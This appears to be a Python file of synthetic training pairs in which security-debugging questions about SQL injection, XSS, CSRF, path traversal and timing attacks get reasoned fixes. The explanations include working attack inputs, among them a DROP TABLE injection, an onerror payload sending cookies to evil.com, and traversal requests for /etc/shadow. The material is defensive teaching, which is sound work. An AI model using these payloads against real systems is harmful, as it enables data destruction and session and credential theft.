PAIRS = [
    ("thinking/debugging", r'''I thought using an ORM would protect against SQL injection, but our security audit found this vulnerability:

```python
from sqlalchemy import text

@app.route('/api/search')
def search():
    query = request.args.get('q', '')
    sort_by = request.args.get('sort', 'name')

    # Parameterized query -- SAFE
    results = db.session.execute(
        text("SELECT * FROM products WHERE name LIKE :query"),
        {'query': f'%{query}%'}
    )

    # But this is VULNERABLE:
    results = db.session.execute(
        text(f"SELECT * FROM products WHERE name LIKE :query ORDER BY {sort_by}"),
        {'query': f'%{query}%'}
    )

    return jsonify([dict(r) for r in results])
```

The `sort_by` parameter is injected directly into the SQL string. How do I fix it?''', r'''<think>
The query parameter is properly parameterized (`:query`), but `sort_by` is string-interpolated directly into the SQL using f-string. An attacker could pass `sort=name; DROP TABLE products; --` or use blind SQL injection via ORDER BY.

Example attack: `GET /api/search?q=laptop&sort=name; DROP TABLE products; --`

The fix: whitelist allowed sort columns instead of passing user input directly into SQL.

You cannot parameterize ORDER BY column names because SQL parameters can only be used for values, not identifiers (table/column names).
</think>

The `sort_by` parameter is string-interpolated directly into the SQL query, making it vulnerable to SQL injection. Parameterized queries (`:query`) only protect values, not SQL identifiers like column names, table names, or ORDER BY clauses.

**The vulnerability:**

```
GET /api/search?q=laptop&sort=name; DROP TABLE products; --

Generated SQL:
SELECT * FROM products WHERE name LIKE '%laptop%' ORDER BY name; DROP TABLE products; --
```

Or more subtle blind SQL injection:

```
GET /api/search?q=laptop&sort=(CASE WHEN (SELECT count(*) FROM users WHERE role='admin')>0 THEN name ELSE price END)
```

This leaks information about the database structure without visible errors.

**Fix: Whitelist allowed column names**

```python
ALLOWED_SORT_COLUMNS = {
    'name': 'name',
    'price': 'price',
    'created_at': 'created_at',
    'rating': 'average_rating',  # can map friendly names to actual columns
}

@app.route('/api/search')
def search():
    query = request.args.get('q', '')
    sort_by = request.args.get('sort', 'name')
    sort_dir = request.args.get('dir', 'asc')

    # Validate sort column against whitelist
    if sort_by not in ALLOWED_SORT_COLUMNS:
        sort_by = 'name'  # default to safe value

    # Validate sort direction
    if sort_dir.lower() not in ('asc', 'desc'):
        sort_dir = 'asc'

    actual_column = ALLOWED_SORT_COLUMNS[sort_by]

    results = db.session.execute(
        text(f"SELECT * FROM products WHERE name LIKE :query ORDER BY {actual_column} {sort_dir}"),
        {'query': f'%{query}%'}
    )

    return jsonify([dict(r) for r in results])
```

Since `actual_column` comes from your whitelist (not from user input), this is safe.

**Even better: Use SQLAlchemy ORM instead of raw SQL**

```python
from sqlalchemy import asc, desc

SORT_COLUMNS = {
    'name': Product.name,
    'price': Product.price,
    'created_at': Product.created_at,
}

@app.route('/api/search')
def search():
    query_str = request.args.get('q', '')
    sort_by = request.args.get('sort', 'name')
    sort_dir = request.args.get('dir', 'asc')

    column = SORT_COLUMNS.get(sort_by, Product.name)
    direction = desc if sort_dir == 'desc' else asc

    results = Product.query.filter(
        Product.name.ilike(f'%{query_str}%')
    ).order_by(
        direction(column)
    ).all()

    return jsonify([p.to_dict() for p in results])
```

The ORM approach never constructs SQL strings manually, eliminating the injection risk entirely.

**Other common ORM SQL injection vectors:**

```python
# VULNERABLE: raw SQL in filter
db.session.execute(text(f"SELECT * FROM users WHERE {user_input}"))

# VULNERABLE: raw SQL in order_by
query.order_by(text(user_input))

# VULNERABLE: raw SQL in group_by
query.group_by(text(user_input))

# SAFE: ORM methods with Python objects
query.filter(User.name == user_input)
query.order_by(User.name)
```

**Prevention tips:**
- Never interpolate user input into SQL strings, even inside an ORM
- Use parameterized queries for values and whitelists for identifiers
- Prefer ORM query builders over raw SQL
- Use SQLAlchemy's `literal_column()` only with validated input
- Enable SQL query logging to review generated queries
- Run automated security scanners (Bandit, SQLMap) in your CI pipeline'''),

    ("thinking/debugging", r'''Our security scanner found an XSS vulnerability in our Jinja2 template:

```python
@app.route('/profile/<username>')
def profile(username):
    user = get_user(username)
    return render_template('profile.html', user=user)
```

Template (profile.html):
```html
<h1>Welcome, {{ user.display_name }}</h1>
<div class="bio">{{ user.bio | safe }}</div>
<script>
    var userData = {{ user.to_json() }};
</script>
```

The scanner found XSS in three places. Where are the vulnerabilities?''', r'''<think>
Let me analyze each usage:

1. `{{ user.display_name }}` - This is auto-escaped by Jinja2 by default. If the user's display name is `<script>alert(1)</script>`, it would be rendered as `&lt;script&gt;alert(1)&lt;/script&gt;`. SAFE (assuming autoescaping is enabled).

2. `{{ user.bio | safe }}` - The `| safe` filter DISABLES autoescaping! If user.bio contains `<script>alert(1)</script>`, it will be rendered as raw HTML. VULNERABLE.

3. `var userData = {{ user.to_json() }};` - This is injecting into a JavaScript context. Even if the JSON is escaped for HTML, there are JavaScript-specific issues. For example, if to_json() returns `{"name": "</script><script>alert(1)</script>"}`, the browser sees the closing `</script>` tag and interprets the rest as new HTML. VULNERABLE.

Also, if the JSON contains special characters like `\u2028` (line separator), they would break JavaScript parsing.
</think>

There are two definite XSS vulnerabilities and one that depends on configuration. Let me analyze each:

**Vulnerability 1: `{{ user.bio | safe }}` -- Direct XSS**

The `| safe` filter tells Jinja2 to skip HTML escaping. If a user sets their bio to:

```html
<img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie">
```

This renders as raw HTML, executing arbitrary JavaScript in every visitor's browser.

Fix:
```html
<!-- Option 1: Remove | safe (auto-escape) -->
<div class="bio">{{ user.bio }}</div>

<!-- Option 2: Use a sanitization library if you need some HTML -->
<div class="bio">{{ user.bio | sanitize }}</div>
```

```python
# Custom sanitize filter using bleach
import bleach

@app.template_filter('sanitize')
def sanitize_html(value):
    allowed_tags = ['p', 'br', 'strong', 'em', 'a', 'ul', 'li']
    allowed_attrs = {'a': ['href', 'title']}
    return bleach.clean(value, tags=allowed_tags, attributes=allowed_attrs)
```

**Vulnerability 2: `var userData = {{ user.to_json() }};` -- JavaScript context XSS**

Even with HTML escaping, injecting data into a `<script>` block is dangerous. If `to_json()` returns:

```json
{"name": "</script><script>alert(document.cookie)</script>"}
```

The browser sees `</script>` and closes the script block. Everything after is treated as new HTML, executing the attacker's script.

Fix:
```html
<!-- Option 1: Use data attributes -->
<div id="user-data" data-user="{{ user.to_json() | e }}"></div>
<script>
    var userData = JSON.parse(
        document.getElementById('user-data').getAttribute('data-user')
    );
</script>

<!-- Option 2: Use tojson filter (Jinja2 built-in, escapes for JS) -->
<script>
    var userData = {{ user.to_dict() | tojson }};
</script>
```

The `| tojson` filter properly escapes `</script>`, `<!--`, and other dangerous sequences for JavaScript contexts.

**Vulnerability 3: `{{ user.display_name }}` -- Potentially safe**

This is auto-escaped by Jinja2 IF autoescaping is enabled (default in Flask). But:

```python
# If autoescaping is disabled, this is vulnerable:
app = Flask(__name__)
app.jinja_env.autoescape = False  # DANGER!

# Or if using Markup() to mark input as safe:
user.display_name = Markup(user_input)  # bypasses autoescaping!
```

**Complete secure template:**

```html
<h1>Welcome, {{ user.display_name }}</h1>

<div class="bio">{{ user.bio | sanitize }}</div>

<div id="user-data" data-user="{{ user.to_dict() | tojson | e }}"></div>
<script>
    var userData = JSON.parse(
        document.getElementById('user-data').dataset.user
    );
</script>
```

**Prevention tips:**
- Never use `| safe` on user-controlled content
- Never inject data directly into `<script>` blocks
- Use `| tojson` for JavaScript data, not `| safe` or raw output
- Use Content Security Policy (CSP) headers as defense in depth
- Sanitize HTML with bleach or DOMPurify if you need to allow some formatting
- Set `HttpOnly` and `Secure` flags on session cookies to limit XSS damage
- Enable Jinja2 autoescaping (default in Flask): `app.jinja_env.autoescape = True`'''),

    ("thinking/debugging", r'''Our CSRF protection is being bypassed. The token check works for form submissions but not for AJAX requests:

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/api/transfer', methods=['POST'])
def transfer():
    amount = request.json['amount']
    to_account = request.json['to_account']
    # ... process transfer ...
    return jsonify({'status': 'success'})
```

```javascript
// Frontend AJAX request
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        amount: 1000,
        to_account: 'attacker-account',
    }),
});
```

The CSRF token is not being sent with the AJAX request. An attacker's page can make this same request because there's no CSRF check on JSON endpoints.''', r'''<think>
Flask-WTF's CSRFProtect checks for CSRF tokens in:
1. Form data (field named `csrf_token`)
2. Headers (`X-CSRFToken` or `X-CSRF-Token`)

For AJAX/JSON requests, the CSRF token must be sent in a custom header. The frontend code is not including the CSRF token header.

But there is a deeper issue: some developers think that JSON Content-Type prevents CSRF because browsers cannot submit JSON via forms. However, this is NOT true -- an attacker can use `fetch()` from a malicious page if CORS is misconfigured, or use `navigator.sendBeacon()` or an XML request with text/plain content type that the browser won't preflight.

Wait, actually: cross-origin `fetch()` with `Content-Type: application/json` WILL trigger a CORS preflight. If the server does not set `Access-Control-Allow-Origin` for the attacker's origin, the browser blocks the response. But the REQUEST is still sent! The server processes it before the browser blocks the response.

So CSRF protection is still needed even for JSON APIs.
</think>

The AJAX request is not including the CSRF token, and Flask-WTF will either reject it (if CSRF is properly enforced) or the endpoint is not checking for it. Let me address both the immediate fix and common misconceptions.

**Misconception: "JSON APIs don't need CSRF protection"**

Some developers believe that because browsers cannot submit `application/json` via HTML forms, CSRF is impossible. This is **wrong**:

1. An attacker can submit JSON via `fetch()` from their malicious page
2. CORS preflight blocks the response, but the **request is still processed by the server**
3. `navigator.sendBeacon()` can send POST requests without CORS checks
4. Content-Type can be manipulated (e.g., `text/plain` avoids preflight)

**Fix: Include CSRF token in AJAX requests**

```html
<!-- In your base template, make token available -->
<meta name="csrf-token" content="{{ csrf_token() }}">
```

```javascript
// Read the token from the meta tag
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Include it in all AJAX requests
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrfToken,  // Flask-WTF checks this header
    },
    body: JSON.stringify({
        amount: 1000,
        to_account: 'target-account',
    }),
    credentials: 'same-origin',  // include cookies
});
```

**Set up a global AJAX interceptor (for fetch):**

```javascript
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Wrap fetch to automatically include CSRF token
const originalFetch = window.fetch;
window.fetch = function(url, options = {}) {
    if (options.method && options.method.toUpperCase() !== 'GET') {
        options.headers = options.headers || {};
        if (options.headers instanceof Headers) {
            options.headers.set('X-CSRFToken', csrfToken);
        } else {
            options.headers['X-CSRFToken'] = csrfToken;
        }
    }
    return originalFetch(url, options);
};
```

**For Axios:**

```javascript
axios.defaults.headers.common['X-CSRFToken'] = csrfToken;
```

**Server-side: Ensure CSRF is enforced on all state-changing endpoints**

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# CSRFProtect automatically checks:
# 1. POST/PUT/PATCH/DELETE requests
# 2. Looks for token in form data OR X-CSRFToken header

# To exempt specific endpoints (e.g., webhooks from third parties):
@csrf.exempt
@app.route('/webhooks/stripe', methods=['POST'])
def stripe_webhook():
    # Verify webhook signature instead of CSRF
    verify_stripe_signature(request)
```

**Additional defense: SameSite cookies**

```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # or 'Strict'
app.config['SESSION_COOKIE_SECURE'] = True       # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True      # no JS access
```

SameSite cookies prevent the browser from sending cookies with cross-origin requests, providing defense against CSRF even without tokens.

**Prevention tips:**
- Include CSRF tokens in all state-changing AJAX requests
- Set SameSite=Lax on session cookies as defense in depth
- Never use GET requests for state-changing operations
- Use a global request interceptor to add CSRF tokens automatically
- Verify Origin/Referer headers as an additional CSRF check
- For API-only services, consider using Bearer tokens instead of cookies (no CSRF risk)'''),

    ("thinking/debugging", r'''Our security scanner found a path traversal vulnerability:

```python
@app.route('/api/files/<filename>')
def get_file(filename):
    filepath = os.path.join('/var/app/uploads', filename)
    return send_file(filepath)
```

The attacker can request:
```
GET /api/files/../../etc/passwd
```

And read arbitrary files from the server. Even though os.path.join is used, it doesn't prevent traversal.''', r'''<think>
os.path.join('/var/app/uploads', '../../etc/passwd') produces '/var/app/uploads/../../etc/passwd' which resolves to '/etc/passwd'. os.path.join does NOT sanitize the path -- it simply concatenates path components.

Actually, on some systems, os.path.join has an even worse behavior: if the second argument starts with '/', it discards the first argument entirely. So os.path.join('/var/app/uploads', '/etc/passwd') = '/etc/passwd'.

The fix: validate that the resolved path is within the allowed directory using os.path.realpath() or pathlib.
</think>

`os.path.join()` does NOT sanitize paths or prevent directory traversal. It simply concatenates path components:

```python
os.path.join('/var/app/uploads', '../../etc/passwd')
# Result: '/var/app/uploads/../../etc/passwd'
# Resolves to: '/etc/passwd'

# Even worse:
os.path.join('/var/app/uploads', '/etc/passwd')
# Result: '/etc/passwd'  (absolute path replaces everything!)
```

**Attack vectors:**

```
GET /api/files/../../etc/passwd          -> reads /etc/passwd
GET /api/files/../../etc/shadow          -> reads password hashes
GET /api/files/../../../proc/self/environ -> reads environment variables (secrets!)
GET /api/files/....//....//etc/passwd    -> double-encoding bypass
```

**Fix 1: Validate the resolved path is within the allowed directory**

```python
import os

UPLOAD_DIR = '/var/app/uploads'

@app.route('/api/files/<filename>')
def get_file(filename):
    # Resolve to absolute path (eliminates ../ traversal)
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))

    # Verify the resolved path is within the allowed directory
    if not filepath.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):
        abort(403)  # Forbidden

    if not os.path.isfile(filepath):
        abort(404)

    return send_file(filepath)
```

`os.path.realpath()` resolves all symlinks and `..` components, giving the true absolute path. Then we verify it starts with the upload directory.

**Fix 2: Use Flask's safe_join (simpler)**

```python
from werkzeug.utils import safe_join

@app.route('/api/files/<filename>')
def get_file(filename):
    filepath = safe_join(UPLOAD_DIR, filename)
    if filepath is None:
        abort(400)  # safe_join returns None if traversal detected
    return send_file(filepath)
```

**Fix 3: Use send_from_directory (Flask built-in)**

```python
@app.route('/api/files/<filename>')
def get_file(filename):
    return send_from_directory(UPLOAD_DIR, filename)
```

`send_from_directory()` handles path validation internally and raises 404 for traversal attempts.

**Fix 4: Use pathlib for modern Python**

```python
from pathlib import Path

UPLOAD_DIR = Path('/var/app/uploads').resolve()

@app.route('/api/files/<filename>')
def get_file(filename):
    filepath = (UPLOAD_DIR / filename).resolve()

    # Check if resolved path is under the upload directory
    if not str(filepath).startswith(str(UPLOAD_DIR)):
        abort(403)

    if not filepath.is_file():
        abort(404)

    return send_file(str(filepath))
```

**Additional hardening:**

```python
import re

def sanitize_filename(filename):
    """Remove any path components from the filename."""
    # Strip directory separators
    filename = os.path.basename(filename)
    # Remove null bytes (bypass technique)
    filename = filename.replace('\x00', '')
    # Allow only safe characters
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError(f"Invalid filename: {filename}")
    return filename
```

**Prevention tips:**
- Never use user input directly in file paths
- Always resolve paths with `os.path.realpath()` and verify the prefix
- Use `send_from_directory()` in Flask for serving static files
- Strip null bytes from filenames (some systems truncate at null bytes)
- Use allowlists for file extensions
- Run your application with minimal filesystem permissions
- Disable directory listing on your web server'''),

    ("thinking/debugging", r'''Our password comparison is vulnerable to a timing attack:

```python
import hmac

def verify_api_key(provided_key, stored_key):
    return provided_key == stored_key
```

A security auditor says this is vulnerable because the `==` operator short-circuits, allowing an attacker to determine the correct key one character at a time. How does this work and how do I fix it?''', r'''<think>
String comparison with `==` in Python (and most languages) compares character by character and returns False as soon as a mismatch is found. This means:
- Comparing "AAAA" with "BAAA" returns almost immediately (first char differs)
- Comparing "AAAA" with "ABAA" takes slightly longer (second char differs)
- Comparing "AAAA" with "AAAA" takes the longest (all chars compared)

By measuring response time, an attacker can determine how many leading characters are correct. They can brute-force the key one character at a time instead of needing to try all possible keys.

The fix: use hmac.compare_digest() which takes constant time regardless of where the difference is.
</think>

The `==` operator for string comparison short-circuits: it returns `False` as soon as it finds the first mismatched character. This creates a measurable timing difference that an attacker can exploit.

**How the timing attack works:**

```
Comparing "ABCDEF" == "XBCDEF":  stops at char 0  -> ~100ns
Comparing "ABCDEF" == "AXCDEF":  stops at char 1  -> ~110ns
Comparing "ABCDEF" == "ABXDEF":  stops at char 2  -> ~120ns
Comparing "ABCDEF" == "ABCDEF":  compares all 6   -> ~160ns
```

The difference per character is tiny (nanoseconds), but with thousands of requests and statistical analysis, an attacker can reliably detect which prefix is correct. They brute-force one character at a time:

```
Step 1: Try all values for char[0], measure times -> find 'A' is slowest
Step 2: Fix char[0]='A', try all values for char[1] -> find 'B' is slowest
Step 3: Fix chars[0:2]='AB', try char[2] -> find 'C'
...
```

A 32-character hex API key has 16^32 possible values (brute force). With timing attack, it takes only 32 * 16 = 512 attempts -- trivially easy.

**Fix: Use constant-time comparison**

```python
import hmac
import secrets

def verify_api_key(provided_key, stored_key):
    # hmac.compare_digest compares ALL bytes regardless of where they differ
    # Takes the same amount of time whether keys match or not
    return hmac.compare_digest(
        provided_key.encode('utf-8'),
        stored_key.encode('utf-8')
    )
```

`hmac.compare_digest()` (also `secrets.compare_digest()` in Python 3.6+) XORs all bytes and returns whether the result is zero. It processes every byte regardless of mismatches, so the timing is constant.

**Also fix: Prevent length-based timing leaks**

```python
def verify_api_key(provided_key, stored_key):
    # Hash both keys before comparing to normalize length
    # This prevents length differences from leaking information
    provided_hash = hmac.new(b'key-verify', provided_key.encode(), 'sha256').digest()
    stored_hash = hmac.new(b'key-verify', stored_key.encode(), 'sha256').digest()
    return hmac.compare_digest(provided_hash, stored_hash)
```

Hashing first ensures both values have the same length (32 bytes for SHA-256), so even the length comparison step is constant-time.

**Where timing attacks apply:**

```python
# VULNERABLE: all of these short-circuit
provided_key == stored_key
provided_token == session_token
provided_signature == expected_signature
password_hash == stored_hash

# SAFE: constant-time comparison
hmac.compare_digest(a, b)
secrets.compare_digest(a, b)
```

**Real-world impact:**

Timing attacks have been demonstrated against:
- API key validation
- HMAC signature verification
- OAuth token comparison
- Password reset token validation
- Session ID comparison

**For password verification, use bcrypt/argon2:**

```python
import bcrypt

# Store:
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Verify (constant-time internally):
if bcrypt.checkpw(provided_password.encode(), stored_hash):
    # authenticated
```

`bcrypt.checkpw()` uses constant-time comparison internally.

**Prevention tips:**
- Use `hmac.compare_digest()` for ALL security-sensitive string comparisons
- Use bcrypt or argon2 for password hashing (they handle timing safety internally)
- Hash tokens before comparing to normalize lengths
- Add rate limiting as defense in depth against brute-force attacks
- Use sufficiently long random tokens (32+ bytes) to make brute-force infeasible
- Monitor for unusual patterns of failed authentication attempts'''),
]
